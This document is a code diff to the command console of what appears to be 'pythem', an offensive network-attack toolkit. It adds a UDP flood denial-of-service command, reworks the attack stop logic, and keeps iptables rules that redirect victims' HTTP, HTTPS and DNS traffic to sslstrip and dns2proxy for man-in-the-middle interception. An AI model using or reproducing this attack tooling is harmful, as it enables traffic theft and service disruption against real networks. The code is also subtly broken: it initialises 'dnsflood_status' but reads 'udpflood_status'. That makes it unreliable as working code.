@@ -33,7 +33,7 @@ import psutil
 class Processor(object):
 	name = "Interface-Processor"
 	desc = "Console to process commands"
-	version = "0.7"
+	version = "0.8"
 
 
 	def __init__(self):
@@ -52,17 +52,19 @@ class Processor(object):
 		self.filter = None
 		self.arpmode = "rep"
 
-		#Status manager
+		#Status
 		self.jarvis_status = 0
 		self.arpspoof_status = False
 		self.inject_status = False
 		self.dnsspoof_status = False
 		self.dnsdrop_status = 0
 		self.synflood_status = 0
+		self.dnsflood_status = 0
 		self.sslstrip_status = False
 		self.dns2proxy_status = False
 
 
+		# Recursive "shell=True" process killing
 	def pskill(self, proc_pid):
         	process = psutil.Process(proc_pid)
         	for proc in process.children(recursive=True):
@@ -70,29 +72,41 @@ class Processor(object):
         	process.kill()
 
 
-
+		# Main
 	def start(self):
 		try:
+				#Untill break or CTRL+C
 			while 1:
+					#Call the object Completer code in modules/completer.py
 				completer = Completer("pythem")
+					#Use termocolor import to set the default commandline red
 				console = termcolor.colored("pythem>","red", attrs=["bold"])
+					#Iterable console shell commands with the while 1
 				self.command = raw_input("{} ".format(console))
-				self.argv = self.command.split()
-				self.input_list = [str(a) for a in self.argv]
+					# Separate the user input by spaces " ", can use like this too: self.input_list = [str(a) for a in self.argv] 
+				self.input_list = self.command.split()
+
 				try:
 
+						# HELP
 					if self.input_list[0] == "help":
 						print_help()
 
+						# HSTSBYPASS
 					elif self.command == "hstsbypass":
 						if self.arpspoof_status:
 							print "[*] SSLstrip+ initialized"
 							print "      |_by: LeonardoNve && M.Marlinspike"
 							print "[*] DNS2Proxy initialized"
 							print "      |_by: LeonardoNve"
+
+								#iptables redirect traffic to port that sslstrip are listening
 							os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8000")
-							os.system("iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 53")
 							os.system("iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8000")
+								#iptables redirect traffic to port that dns2proxy are listening
+							os.system("iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 53")
+
+								#Start subprocess with shell=True with sslstrip2 and dns2proxy
 			                        	with open("log/sslstrip.log", "a+") as stdout:
                                 				self.p1 = subprocess.Popen(["python sslstrip2/sslstrip.py -l 8000","sslstrip"], shell=True, stdout=stdout, stderr=stdout)
 								self.sslstrip_status = True
@@ -464,9 +478,20 @@ class Processor(object):
 								else:
 									print "[!] You need to start a arpspoof on a target (IP/Range) to start dnsdrop."
 
+							elif self.input_list[1] == "udpflood":
+								if self.targets == None:
+									print "[!] You probably forgot to set a IP address as target."
+								else:
+									try:
+										myip = get_myip(self.interface)
+										self.dos.udpfloodstart(myip,self.targets,self.port)
+										self.udpflood_status = 1
+									except TypeError:
+										print "[!] You probably forgot to set a network interface."
+
 							elif self.input_list[1] == "synflood":
 								if self.targets == None:
-									print "[!] You probably forgot to set a IP address as target"
+									print "[!] You probably forgot to set a IP address as target."
 								else:
 									try:
 										myip = get_myip(self.interface)
@@ -475,14 +500,13 @@ class Processor(object):
 									except TypeError:
 										print "[!] You probably forgot to set interface."
 							elif self.input_list[1] == "stop":
-								if self.dnsdrop_status == 1 and self.synflood_status == 1:
+								if self.udpflood_status == 1:
+									self.dos.udpfloodstop()
+								if self.dnsdrop_status == 1:
 									self.dos.dnsdropstop()
+								if self.synflood_status == 1:
 									self.dos.synfloodstop()
-								elif self.dnsdrop_status == 1:
-									self.dos.dnsdropstop()
-								elif self.synflood_status == 1:
-									self.dos.synfloodstop()
-								else:
+								if self.udpflood_status == 0 and self.dnsdrop_status == 0 and self.synflood_status == 0:
 									print "[!] You need to start a DoS attack before call stop."
 							else:
 								print "[!] Select a valid option, type help to check syntax."
